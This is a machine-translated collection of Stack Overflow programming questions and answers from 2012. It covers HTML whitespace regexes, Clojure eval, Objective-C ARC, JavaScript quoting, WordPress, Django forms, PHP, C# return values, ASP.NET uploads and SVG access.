## 回答 #1

> 赞同：28
> 
> 时间：2012-08-17T23:41:25.967

这是（不是，请参阅规则之后）因为字符串是不可变的，我认为，并且您将父元素的 innerHTML 设置为与您之前从中检索到的完全相同的字符串。

相反，我建议：

```
var firstname = document.getElementsByTagName('input')[0],
    parentHTML = firstname.parentNode.innerHTML,
    newHTML = parentHTML.replace(/\>\s+\</g,'');
firstname.parentNode.innerHTML = newHTML;

console.log(parentHTML, newHTML, (parentHTML == newHTML)); 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/wygnD/1/)。

* * *

关于 jfriend00 的评论（如下），似乎正则表达式是问题所在，`\n`与提供的模式不匹配，在这种情况下，以下修改满足要求：

```
var firstname = document.getElementsByTagName('input')[0],
    parentHTML = firstName.parentNode.innerHTML;
parentHTML = parentHTML.replace(/>\s+</g, "><");
firstName.parentNode.innerHTML = parentHTML;

console.log(firstname, parentHTML);​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/wygnD/3/)。

参考：

*   [JavaScript 正则表达式](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Regular_Expressions)。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2016-10-13T16:45:18.923

在大多数情况下，我建议从以下位置删除空间：

*   文件开头
*   文件结束
*   `>`字符后
*   `<`字符前

我可以想到两种情况，这不会满足您的要求，这两种情况会影响上述不太激进的解决方案。

*   元素之间的空白空间`inline-block`实际上是布局的预期或预期部分。如果此空间折叠为零字符，则删除元素之间的隐式空间。这可以通过将下面的正则表达式更改为`" "`.

*   我的原始答案已更新，以保留`<script>`、`<style>`、`<pre>`或`<textarea>`标签中的空格。所有这些除了`<pre>`CDATA 表示内容不是 HTML 并且被解析直到找到结束标记，这意味着正则表达式是一个完整的解决方案。如果 a`<pre>`是嵌套的或使用了`white-space`CSS 属性，这将不会保留您的内容。

解决方案：

```
 collapsed = expanded.replace(/(<(pre|script|style|textarea)[^]+?<\/\2)|(^|>)\s+|\s+(?=<|$)/g, "$1$3"); 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-04-09T09:35:29.660

只有空格：

```
parentHTML = parentHTML.replace( new RegExp( "\>[ ]+\<" , "g" ) , "><" ); 
```

新行、制表符和空格：

```
parentHTML = parentHTML.replace( new RegExp( "\>[\s]+\<" , "g" ) , "><" ); 
```

[https://regex101.com/r/sD7cT8/1](https://regex101.com/r/sD7cT8/1)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-08-17T23:44:20.393

你能把一个html标签当作js中的一个字符串吗？我想这是可以做到的。尝试这个！

```
s.replace(/\s+/g, ' '); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-02-11T17:32:35.307

我遇到了这个线程，因为我正在寻找一种解决方案来消除由 HTML 源代码中的空白或在我的情况下换行引起的 div 周围的空白。

在我意识到空白可能导致这些空白之前，我已经发疯了，试图摆脱它们。我想保持我的 HTML 源代码的可读性，所以压缩代码对我来说不是一个好的解决方案。即使我以这种方式处理它，它也无法修复由 Google 和其他供应商生成的 div。

我首先创建了以下函数并在 body onload 中调用它。

```
function Compress_Html() {
    //Remove whitespace between html tags to prevent gaps between divs.
    document.body.innerHTML = document.body.innerHTML.replace( /(^|>)\s+|\s+(?=<|$)/g, "$1" );
} 
```

这似乎工作得很好，但不幸的是，它破坏了我在页脚中的谷歌搜索框。

在尝试了许多正则表达式模式的变体但没有成功后，我在[http://www.regexpal.com/](http://www.regexpal.com/)找到了这个正则表达式测试器。据我所知，以下模式可以满足我的需要。

```
( /(^|>)[ \n\t]+/g, ">" ) 
```

也就是说，该功能仍在破坏搜索框。所以我最终将它移动到一个 jQuery 文档就绪函数中。现在它正在工作并且不会破坏搜索框。

```
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>
    $( document ).ready(function() {
        document.body.innerHTML = document.body.innerHTML.replace( /(^|>)[ \n\t]+/g, ">" );
    });
</script> 
```

# variables - 计算引用的表达式 Clojure

> ID：12014442
> 
> 赞同：0
> 
> 时间：2012-08-17T23:38:11.907
> 
> 标签：variables, clojure

我很确定这个解决方案非常简单，但很难找到......所以如果我

```
=> (def x '(1 (dec 3) 3))
;user/x 
```

如何评估表达式以便

```
=> (***insert function here** x)
;(1 2 3) 
```

到目前为止，`unquote`我已经得到`(1 (dec 3) 3)`了，这是没有引号的 x，而不是我想要的。我研究了``~x`哪个返回相同的结果。是否有一些 ~ @ 和 ` 的组合返回评估的函数？（我在这里抛出函数，这些不是限制）

如果可能，请尽量不要更改我对 x 的原始定义。

* * *

好的，假设对于这个问题，表达式是`'(list 1 (dec 3) 3)` 现在我如何检索

```
=> (***insert function here** x)
;(1 2 3) 
```

是的，现在 eval 有效。感谢您添加重要的输入。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:47:33.800

这可以通过映射`eval`序列列表来完成。

```
core> (def x '(1 (dec 3) 3))                                                                   
core/x                                                                                       
core> x                                                                                        
(1 (dec 3) 3)                                                                                              
core> (map eval x)                                                                             
(1 2 3)                                                                                                    
core> 
```

since `(1 2 3)` is not a proper function call we can fix that and then use eval, which would then handle arbitrarily nested functions.

```
utotestbed.core> (def x '(1 (dec 3) 3))                                                                   
#'autotestbed.core/x                                                                                       
autotestbed.core> (eval (cons 'list x))                                                                    
(1 2 3) 
```

# objective-c - 了解自动引用计数

> ID：12014452
> 
> 赞同：0
> 
> 时间：2012-08-17T23:40:19.370
> 
> 标签：objective-c, automatic-ref-counting

我理解自动引用计数的方式是这样的：

如果一个对象要被各种类使用，它应该是“strong”类型，这样它就可以保留，而其他人可能正在使用它。

如果一个对象只是一个类的内部结构，它可以是“弱”类型，因为一旦当前类实现完成处理它，它就会消失。

还有比这更多的吗？

这是我想象的一个例子：

```
#import "World.h"
@interface Foo : NSObject
@property (nonatomic, strong) NSArray *barArray;
@property (nonatomic, weak) NSString *bazString;
@end

@implementation Foo
-(void)sendTheArrayIntoTheWorld {
    self.barArray = [NSArray arrayWithObject:@"lonely item"];
    [World takeTheArray:self.barArray]; // array is strong so it can exist indefinitely
}

-(void)useThatString {
    self.bazString = "weak old string"; // string is weak because it should be discarded when it's no longer needed here...
}
@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T23:44:59.710

这并不是 ARC 的工作原理。归结为：

*   强引用是唯一使对象保持活动状态的引用
*   一个对象至少需要一个`strong`引用才能保持活动状态
*   弱引用不会使对象保持活动状态——如果一个对象有 100 个弱引用但没有强引用，则该对象将被释放
*   给一个属性赋值`weak`而不在其他地方引用它会导致它立即被释放，就像你的`bazString`. 如果您在为其分配值后尝试访问该字符串（除非它由另一个对象拥有，例如数组，但在您的情况下不是），您会发现它是`nil`.

这意味着弱引用应该用于您不一定要“控制”的对象，例如委托。如果你对委托使用强引用并且委托对你有强引用，那么这两个对象都不会被释放。这称为保留周期。

**如果您需要一个对象在完成之前一直保持活力，请使用`strong`. 否则，使用`weak`.**

[您可以在此处](http://developer.apple.com/library/mac/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html)阅读有关 ARC 的复杂性和功能的更多信息。

# javascript - 对字符串使用单引号还是双引号？

> ID：12014453
> 
> 赞同：1
> 
> 时间：2012-08-17T23:40:19.163
> 
> 标签：javascript

> **可能重复：**
> [Javascript中单引号和双引号之间的区别](https://stackoverflow.com/questions/3149192/difference-between-single-quotes-and-double-quotes-in-javascript)

我读了一些代码，看起来很多人喜欢对字符串使用单引号。我来自 c#/Java 世界，通常我们使用双引号作为字符串。

使用单引号的任何好处，我知道单/双在 JS 中是等价的。但是使用单/双引号有什么优点和缺点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:41:58.363

这是一个偏好问题。JavaScript 没有区别。

就个人而言，我更喜欢使用单引号。它使在 HTML 中使用双引号变得更容易，您不必转义。这对你来说可能很重要，也可能无关紧要。重要的是你是一致的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:42:40.460

如果要编写包含单引号的字符串，可以方便地用双引号分隔字符串，反之亦然。

```
var a = 'abc "def" ghi';
var b = "foo 'bar' baz"; 
```

除此之外，使用哪个都没有关系。尽可能保持一致。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:44:57.363

在大多数情况下，我认为原因是“您不必按 Shift 来获取单引号”。

有时选择正确的引号会使转义更容易，但这几乎总是个人喜好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-18T00:13:55.123

绝对没有区别。只是不要混搭。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T23:46:11.013

使用其中一个的最佳理由是打算将另一个用作文字内容。这消除了对用作分隔符的字符进行转义的需要。

例如， ' this """ 有双引号' 和 " this 有单 '''' 引号"

# php - 如何将标头中的全局变量加载到外部 Javascript 文件中

> ID：12014454
> 
> 赞同：0
> 
> 时间：2012-08-17T23:40:23.847
> 
> 标签：php, javascript, html, wordpress, global-variables

我在我的 Wordpress 帖子中创建了元数据键，如下所示：prettyAd、prettyName、prettyLink。我想获取每个键的值并将其加载到我网站标题中的全局变量中。

我在我的 WordPress 主题标题中设置全局变量，如下所示...

```
<script type="text/javascript">
    var prettyAd = "<?php echo get_post_meta($post->ID, 'prettyAd', true); ?>";
    var prettyName = "<?php echo get_post_meta($post->ID, 'prettyName', true); ?>";
    var prettyLink = "<?php echo get_post_meta($post->ID, 'prettyLink', true); ?>";
</script> 
```

加载页面时会输出以下内容...

```
<script type="text/javascript">
    var prettyAd = "http://mydomainname.com/ad-placeholders/ad.png";
    var prettyName = "Pet Store Shop";
    var prettyLink = "http://mydomainname.com/advertise/";
</script> 
```

之后，加载了一个外部 JavaScript 文件（prettyphoto.js - 3.1 版），我想访问上面设置的变量。

```
<script type="text/javascript" src="http://mydomain.com/wp-content/themes/wpnavigator/scripts/prettyphoto.js"></script> 
```

一旦上面的文件可以访问变量，我想将它们加载到我引用它们的以下 html 中。

```
<p>
    Sponosor: <a href="var prettyLink" target="_blank">var prettyName</a>
</p>
<p>
    <a href="var prettyLink" target="_blank">
        <img src="var prettyAd" width="468" height="60" alt="Sponsors Ad" />
    </a>
</p> 
```

据我了解，我需要让 JavaScript 编译整个标签，因为我无法将变量直接加载为 src 和 href 值。

所以我正在寻求帮助的是以下内容。

1.  如何将已经在 header.php 中设置的全局变量调用到 prettyphoto.js 文件中
2.  如何编写一个使用这些变量并输出上面显示的 HTML 的函数。
3.  有没有比使用全局变量更好的方法，或者它们是唯一的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T06:04:53.090

我通常将[wp_localize_script](http://codex.wordpress.org/Function_Reference/wp_localize_script)用于这种事情。它的优点是将不同的 js 变量包装到一个全局访问点中。

此处的教程应该可以帮助您入门。 [http://betterwp.net/wordpress-tips/script-localization/](http://betterwp.net/wordpress-tips/script-localization/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:48:40.987

一个非常简单的方法在 html 中是这样的：

```
<p>
 Sponosor: <script type="text/javascript">document.write('<a href="' + prettyLink + '" target="_blank">' + prettyName + '</a>');</script>
</p> 
```

但是，如果您需要访问已加载的脚本，并且您在该脚本中，那么您可以通过窗口访问它

```
var LinkText = window["prettyName"]; 
```

# python - 预填充表单数据 Django

> ID：12014462
> 
> 赞同：2
> 
> 时间：2012-08-17T23:40:57.577
> 
> 标签：python, django

我有一个表单，用户可以在其中编辑他们的个人信息/设置，如果他们过去输入了该信息，我正试图让它预先填充。我看这里：

[Django 使用数据库中的字段预填充表单](https://stackoverflow.com/questions/3095229/django-prepopulate-form-with-the-fields-from-the-database)

寻求帮助，但仍然无法让表单预填充。提前致谢。

```
#model

    class UserProfile(models.Model):

        user = models.OneToOneField(User)
        activation_key = models.CharField(max_length=40, blank=True)
        first_name = models.CharField(max_length=50, blank=True)
        last_name = models.CharField(max_length=50, blank=True)
        phone_number = PhoneNumberField(blank=True, null=True)
        address_line_1 = models.CharField(max_length=300, blank=True)
        address_line_2 = models.CharField(max_length=300, blank=True)
        address_line_3 = models.CharField(max_length=300, blank=True)
        city = models.CharField(max_length=150, blank=True)
        postalcode = models.CharField(max_length=10, blank=True)
        paypal_email = models.EmailField(max_length=75, blank=True)
        photo = models.ImageField(upload_to="images/", blank=True)

        def __unicode__(self):
            return self.user.username

        def save(self, *args, **kwargs):
            try:
                existing = UserProfile.objects.get(user=self.user)
                self.id = existing.id #force update instead of insert
            except UserProfile.DoesNotExist:
                pass 
            models.Model.save(self, *args, **kwargs)

    #form
    class UserProfileForm(forms.ModelForm):

        class Meta:
            model = UserProfile
            exclude = ('user', 'activation_key',)

    # view
    def update_settings(request):
        if request.method== 'POST':
            try:
                u = UserProfile.objects.get(user=request.user)
                form = UserProfileForm(request.POST, instance=u)
            except ObjectDoesNotExist:
                form = UserProfileForm(request.POST, request.FILES)
            if form.is_valid:
                profile = form.save(commit=False)
                profile.user = request.user
                profile.save()
                return HttpResponseRedirect('registration/activation_complete.html')
        else:
            try:
                u = UserProfile.objects.get(user=request.user)
                form = UserProfileForm(request.POST, instance=u)
            except ObjectDoesNotExist:
                form = UserProfileForm(request.POST, request.FILES)
            return render_to_response('registration/update_settings.html', locals(), context_instance=RequestContext(request)) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T05:07:07.853

您可以像这样更新视图代码：

```
def update_settings(request):
    if request.method== 'POST':
        try:
            u = UserProfile.objects.get(user=request.user)
            form = UserProfileForm(request.POST, instance=u)
        except ObjectDoesNotExist:
            form = UserProfileForm(request.POST, request.FILES)
        if form.is_valid():  #is_valid is function not property
            profile = form.save(commit=False)
            profile.user = request.user
            profile.save()
            return HttpResponseRedirect('registration/activation_complete.html')
    else:
        try:
            u = UserProfile.objects.get(user=request.user)
            form = UserProfileForm(instance=u) #No request.POST
        except ObjectDoesNotExist:
            form = UserProfileForm(request.FILES)
   # move it outside of else
   return render_to_response('registration/update_settings.html', locals(),
                 context_instance=RequestContext(request)) 
```

# php - 使用 maqetta 作为 php 应用程序的前端

> ID：12014472
> 
> 赞同：1
> 
> 时间：2012-08-17T23:42:44.400
> 
> 标签：php, html, rich-internet-application, maqetta

我最近发现[了 maqetta](http://maqetta.org)，它可以为 webapps 创建丰富的 html5 ui。我无法找到将 php 应用程序与此集成的最佳方法。像codeigniter这样的东西。

将php放在源代码中是一个好方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-19T20:41:18.863

感谢您对 Maqetta 的关注……在 Maqetta 的 Preview 6 中，我们开始提供有限的 PHP 支持。从发行说明：

> 预览版 6 包括对 *.php 文件的有限支持。如果在“文件”面板中双击 *.php 文件，HTML 可视页面编辑器将打开。可视化编辑器忽略 *.php 文件中的任何结构（将它们视为 HTML 注释）。如果您单击浏览器中的预览以获取 *.php 文件，则该文件会以 mime 类型的 text/html 下载到浏览器，这会导致浏览器在发生 *.html 文件的情况下执行任何操作包含构造（通常被忽略）。
> 
> 此功能对于需要在文件中包含少量 PHP 的 Web 应用程序开发人员非常有用，但请注意，Maqetta 无法针对 PHP 结构实际运行 PHP 引擎；Maqetta 所做的只是尽力忽略一个块内的所有内容。
> 
> 尝试使用此功能的开发人员需要注意他们的 *.php 文件（假设结构被忽略）可以被 Maqetta 页面解析器解释为格式正确的 HTML 文件。

您可能还对 Google 网上论坛上的[Maqetta 用户](http://ibm.co/Pudj7l)论坛感兴趣。已经有几次与 PH​​P 相关的讨论，并且由 Maqetta 开发团队的成员定期监控。

Tony Erwin
Maqetta 团队
博客：[Maqetta - HTML5 用户界面的可视化创作](http://ibm.co/Pudj7l)

# php - PHP 页面未发布且 if 语句已损坏

> ID：12014481
> 
> 赞同：-4
> 
> 时间：2012-08-17T23:43:58.037
> 
> 标签：php, post, if-statement, submit

```
<?php
            $srver = $_GET['S'];
            $fnum = $_GET['F'];
            if ($srver == '')($connect = odbc_connect('van' ,'user' , 'password'));
            if ($srver == '')   {$other_srvr = 'T' ; $other = 'Toronto';}
            if ($srver == 'V') ($connect = odbc_connect('van' ,'user' , 'password'));
            if ($srver == 'V')  {$other_srvr = 'T' ; $other = 'Toronto';}
            if ($srver == 'T') ($connect = odbc_connect("tor" ,"user" , "password"));
            if ($srver == 'T')  {$other_srvr = 'V' ; $other = 'Vancouver';}
            if ($fnum == '')    {$Fnumber = '&F=' ;}
            echo "<form method='post' action=$PHP_SELF> ";
            echo "<a href='mypage.php?S=$other_srvr$Fnumber'>Change Server to $other</a>" ;
            echo "<br>";
            echo "<strong> Filter Number : </strong><input name='F' type='text' size='20'>";
            echo" <input type='submit' name='submit' value='Search' />"; # Create submit button
            echo "</form>"; 
            $sum = array();
            if (isset($_POST['submit'])) 
                    {

                        $r = "1" ; 
                    }
            else
                    {                   

                    $query = Select abc from table;

                    }

                    odbc_close($connect);
?> 
```

所以这是我的代码。问题是我如何让页面提交它只是刷新。有人可以解释一下吗？其次，我正在检查带有 if 语句的服务器，有没有办法在单行中做到这一点。我似乎无法找到它的工作。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:50:37.553

首先，如果 $PHP_SELF 以某种方式起作用，它不在“”中。其次，您需要了解如何将 SQL 与 PHP 一起使用。可能是这样的？

```
$query = mysql_query("SELECT abc FROM table"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:45:39.953

`if ($srver == '')($connect =`应该是`if ($srver == ''){$connect =...`等等，花括号等等。

# c# - 从方法返回多个值

> ID：12014485
> 
> 赞同：7
> 
> 时间：2012-08-17T23:44:50.143
> 
> 标签：c#

我可以想到以下从一个方法返回多个值的方法（一种分为两种方法）

```
private bool IsCarFaulty(Car car, out string fault)
{
  fault = string.Empty;
  return false;
} 
```

* * *

```
private Tuple<bool, string> IsCarFaulty(Car car)
{
  return Tuple.Create(false, string.Empty);
} 
```

* * *

```
private ResultAndMessage IsCarFaulty(Car car)
{
  return new ResultAndMessage(false, string.Empty);
} 
```

* * *

```
private bool IsCarFaulty(Car car)
{
  return false;
}

private string GetCarFault(Car car)
{
  return string.Empty;
} 
```

基本上我的问题是，有没有一种情况比另一种更可取？如果我以**int.TryParse**为例。它使用 out 参数，但无法将其拆分为**CanParse**和**Parse**两种方法，即使不是更好，也同样有效。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:48:32.303

单独的`CanParse`和`Parse`方法的问题是你必须支付两次解析的成本——一次是在`CanParse`，然后是在`Parse`. 当解析非常复杂且耗时（例如，对于像这样的类型`DateTime`）时，这可能会特别成问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T23:49:06.307

当返回多个值时，我更喜欢创建一个强类型的“结果”对象来封装方法的返回值。但是，需要返回多个值也可能表明您的方法做得太多并且可以重构。

例如，您的方法正在返回一个布尔值，以表明汽车是否有故障，以及一条消息。为什么不让方法返回失败类型的枚举值，然后让方法负责将该值转换为错误消息？

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-17T23:50:40.923

> 基本上我的问题是，有没有一种情况比另一种更可取？

当然可以，但我不认为有适用于所有情况的一般规则。只需根据具体情况选择您觉得更舒服的那个。

我通常避免使用`out`参数，因为它们不能很好地与 Linq 配合使用。

> 如果我以 int.TryParse 为例。它使用 out 参数，但无法将其拆分为 CanParse 和 Parse 两种方法，即使不是更好，也同样有效。

当然，它可以工作，但这意味着字符串将被解析两次，这是次优的。

~~当引入 int.TryParse 时，C# 没有可为空的类型~~ *（编辑：实际上它有）*；现在你可以写一个这样的方法：

```
public static int? TryParseInt32(string s)
{
    int i;
    if (int.TryParse(s, out i))
        return i;
    return null;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-18T00:30:35.643

选项：

1.  `out`
    *   **fast**，这就是它在框架库中使用的原因，你不能用速度来换取其他任何东西
    *   **糟糕的设计**，不适合 LINQ 和任何链式代码
    *   **易于编码**
2.  `Tuple<>`
    *   **慢**，创建小对象，但在实践中很少会非常昂贵，因为据说它在 .NET 中得到了很好的优化。不过，我确实发现这是一个问题。
    *   **可维护性差**，没有字段名称，代码没有自我记录
    *   **易于编码**
3.  `Result`
    *   **慢的**
    *   **良好的可维护性**
    *   **更多代码**

显然，没有人能说什么对你的特定情况更好，所以选择你自己。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-17T23:52:17.130

返回多个值的最佳方法是返回一个对象（一个将所有值包装在属性中的类），即

```
private ResultAndMessage IsCarFaulty(Car car)
{
  return new ResultAndMessage(false, string.Empty);
} 
```

类 ResultAndMessage 有两个属性（布尔和字符串）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-18T00:14:45.013

出于几个原因，我更喜欢使用for等方法`bool`返回。`out``TryXXX``TryParse``TryDeque`

1.  结果的“部分”是非常独立的东西，我喜欢它们保持分开。
2.  返回类型在 this 的所有变体中都是相同的。所以这是一致的。
3.  `out`类型始终与调用的类型或对象密切相关，要么是类型本身（如 in ） ，要么`int.TryParse`是类型的类型参数（如`Dictionary<TKey, TValue>.TryGet`and `ConcurrentQueue<T>.TryDequeue`）。所以这是一致的。
4.  它已成为 .NET 中易于识别的模式。所以这是一致的。

最后一点有一个缺点，即人们可能会在其他更合适的情况下转向它（假设输入有效且操作成功，如果不是这种情况则抛出异常，通常会更好）。

我避免`out`在其他情况下，它不能很好地链接，这反过来意味着它在 lambda 表达式中也不是很方便。

当它本身可能进一步使用时，我更喜欢封装不同值的对象。否则，它只是另一个需要学习的课程。

当某个东西同时返回两个不同的值有一个很好的明确原因时，我更喜欢元组，但它不符合上述关于新使用对象本身的内容。

最重要的是，我更喜欢首先只返回一个结果。

对于汽车故障示例，我要么返回一个表示故障的对象，如果它没有故障，则该对象可能为空，一个表示汽车状态的对象，其中“未找到故障”可能是一个可能的值，或者最重要的是，因为汽车可能有不止一个故障（并且确实似乎在 NCT/MOT/您所在国家/地区的等效故障之前开发了几个昂贵的故障）一个可枚举或可查询的对象，它可以让我迭代或查询以找到所有故障，`Count == 0`如果没有故障，它将是空的（如）。

# asp.net - 在 asp.net webforms 应用程序中处理最大文件上传大小

> ID：12014490
> 
> 赞同：2
> 
> 时间：2012-08-17T23:45:22.620
> 
> 标签：asp.net, uploadify, windows-authentication

我有一个配置为 maxRequestLength="4096" 的网络表单应用程序。这很好，我不介意阻止这种大小的请求。现在，我有一个 FileUpload 控件，用户可能会使用它来导致请求过大。如何优雅地处理最大请求长度异常？

我尝试使用 Uploadify 插件来防止文件太大，这在我的开发机器上运行良好。

问题是我们在生产站点上使用 Windows 身份验证，我正在阅读 Flash 在处理 Windows 身份验证时可能会遇到问题。似乎断断续续，我的客户在 Chrome 上看到 Uploadify 出现 401 错误，我可以用 Firefox 复制它。

我应该以不同的方式处理吗？我想做的就是优雅地处理 maxRequestLength 异常，但是当它带来了许多我实际上并不想要的其他功能（多个文件/文件队列/异步帖子）。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T05:12:21.723

没有办法优雅地处理超过 IIS 的“maxRequestLength”设置。

解决此问题的唯一方法是将 maxRequestLength 设置为非常高的 kBytes，然后在文件上传后检查 ContentLength。

由于没有相应的 HTTP 代码，您无法显示自定义错误页面。

# jquery - 提交下拉表单并获取变量（jquery/javascript）

> ID：12014496
> 
> 赞同：0
> 
> 时间：2012-08-17T23:46:12.373
> 
> 标签：jquery, forms, drop-down-menu

我在一种形式中有两个下拉框 - 每个框中只能选择一个选项。在按下表单的提交按钮时，我想将所选选项的值存储在两个不同的变量中。

这是我的表格：

```
<form id="form1" method="post">            
    <select id="slt_country" name="country"> 
        <option value="EN" >England</option>
        <option value="SC" >Scotland</option>
        <option value="IR" >Ireland</option>
    </select>

    <select id="slt_zoom" name="zoom"> 
        <option value="IC" >close</option>
        <option value="SC" >far</option>
    </select>
    <input type="submit" Value="submit" >
</form> 
```

到目前为止，这就是我想出的检索表格的方法：

```
$("#form1").submit (function(){
    var ctry=  $("select#slt_country").val();
    var zm=  $("select#slt_zoom").val();
}); 
```

我已经为应该如此简单的事情苦苦挣扎了太久，所以决定寻求帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:00:12.727

再试一次。它应该工作！;)

# javascript - 访问嵌入文件的元素

> ID：12014498
> 
> 赞同：0
> 
> 时间：2012-08-17T23:46:38.063
> 
> 标签：javascript, svg, web

我有一个 svg 文件，我正在通过我的 javascript 访问它。像这样

```
 this.m_svg = new Element('embed');
this.m_svg.setAttribute("src","img/gauge.svg"); 
```

我之前是内联 svg，所以我能够访问它的所有元素。但后来它（svg 图像）没有在 safari 上渲染。所以，我采用了这种方式。图像现在完美呈现，但是我不确定如何在 javascript 中访问 svg 文件的元素。你能给点建议吗。

在此处粘贴我的 svg 文件代码：

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <g name="gauge" width="122px" height="127px">
        <image xlink:href="gauging.png" width="122" height="127"/>
    <circle id="led" cx="39" cy="76" r="5" style="fill: #999; stroke: none">
        <animateColor id="ledAnimation" attributeName="fill" attributeType="css" begin="0s" dur="1s"
        values="none;#f88;#f00;#f88;none;" repeatCount="0"/>
    </circle>
        <g id="needle" transform="rotate(0,62,62)">
            <circle cx="62" cy="62" r="4" style="fill: #c00; stroke: none"/>
            <rect transform="rotate(-130,62,62)" name="arrow"  x="58" y="38" width="8" height="24" style="fill: #c00; stroke: none"/>
            <polygon transform="rotate(-130,62,62)" points="58,39,66,39,62,30,58,39" style="fill: #c00; stroke: none"/>
        </g>
        <text id="value" x="51" y="98" focusable="false" editable="no" style="stroke:none; fill:#fff; font-family: monospace; font-size: 12px"></text>
    </g>
</svg> 
```

我需要访问元素“针”。

PS：我无法在 html 中添加任何内容。一切都必须在 javascript 端完成。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T02:05:28.307

我创建了一个示例并将其推送到[**git repository**](https://github.com/f0t0n/editsvg)。我使用了您在[**这个问题**](https://stackoverflow.com/questions/12013468/replacing-innerhtml/)中提供的 SVG 图像。它运行良好，但有一个问题 - 背景图像`img/gauge.png`没有第二次加载。

所以目前的问题似乎得到了回答，但是来自 SVG 文件的图像的问题仍然是开放的。

解决方法是将`gauge.png`图像用作元素的背景图像`div`（它是`object`元素的容器）并将其从 SVG 中完全删除。

虽然我以后可能会再玩一次。

# objective-c - 将字符串添加到数组

> ID：12014501
> 
> 赞同：0
> 
> 时间：2012-08-17T23:47:06.930
> 
> 标签：objective-c, c

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

BOOL isChecked; 

//check if there is checkmark there

if([tableView cellForRowAtIndexPath:indexPath].accessoryType == UITableViewCellAccessoryCheckmark){

    isChecked = YES; 

}

else {
    isChecked = NO; 
}

//adds or moves checkmark

if(isChecked == YES){

    NSLog(@"Checkmark removed...");

    UITableViewCell *newCell = [tableView cellForRowAtIndexPath:indexPath];
    newCell.accessoryType = UITableViewCellAccessoryNone; 

    lastIndexPath = indexPath; 

}

if(isChecked == NO){

    NSLog(@"Checkmark added...");

    [chosenSports addObject:[sports objectAtIndex:[indexPath row]]]; 

    NSLog(@"%@",[chosenSports objectAtIndex:0]); 

    UITableViewCell *newCell = [tableView cellForRowAtIndexPath:indexPath]; 
    newCell.accessoryType = UITableViewCellAccessoryCheckmark; 

    lastIndexPath = indexPath; 

}

[tableView deselectRowAtIndexPath:indexPath animated:YES]; 
```

}

由于某种原因，我的 NSLog 的结果为 NULL，表明“chosenSports”数组为空，但我不知道为什么！有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:51:09.827

确保像这样初始化数组（在 viewDidLoad 函数中）：

```
self.chosenSports = [[NSMutableArray alloc] initWith...]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T04:09:09.270

确保你的数组是 NSMutableArray 的一个实例。如果正确完成，那么您知道它`[sports objectAtIndex:[indexPath row]]`的计算结果为零（nil/NULL）。尝试查询数组的计数。

# objective-c - 绘制文本方法不起作用

> ID：12014502
> 
> 赞同：-1
> 
> 时间：2012-08-17T23:47:14.070
> 
> 标签：objective-c, ios, nsstring

我有一种在矩形中绘制字符串的方法，但由于某种原因它不起作用。

这是代码：

```
- (void) drawString: (NSString*) s withFont: (UIFont*) font inRect: (CGRect) contextRect {

    CGFloat fontHeight = font.pointSize;
    CGFloat yOffset = (contextRect.size.height - fontHeight) / 2.0;

    CGRect textRect = CGRectMake(0, yOffset, contextRect.size.width, fontHeight);

    [s drawInRect: textRect withFont: font lineBreakMode: UILineBreakModeClip
        alignment: UITextAlignmentCenter]; } 
```

谢谢你！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:46:47.383

你在这里有两个选择。您可以在您编写的一些自定义视图中实现“drawRect：”，向该视图添加一个属性以设置字符串，并在您希望更新字符串时告诉视图重新显示：

```
[myCustomView setNeedsDisplay]; 
```

另一方面，如果您想将字符串放入图像中，您将使用不同的方法打开图形上下文，将字符串绘制到上下文（位图）中，然后获取从上下文创建的图像。

# php - 错误消息中带有变量的 CakePHP 自定义验证

> ID：12014514
> 
> 赞同：6
> 
> 时间：2012-08-17T23:48:15.947
> 
> 标签：php, validation, cakephp, cakephp-2.1

下午好。

我有一个模型，它有一个名为“百分比”的字段。所有相似模型的百分比加起来不能超过 100%。在验证期间会对此进行检查。

我需要验证错误消息来说明用户剩余的“空间”百分比。例如，如果所有 MyModel 的总数已经达到 80%，并且用户尝试创建一个具有 40% 百分比的新 MyModel，则错误消息会说：“您的百分比太高。您只剩下 20%。”

问题是我不知道如何将变量放入验证错误消息中。

在 MyModel.php 中：

```
public $validate = array(
    'percentage' => array(
        'rule' => array('confirmValidPercentage', 'percentage'),
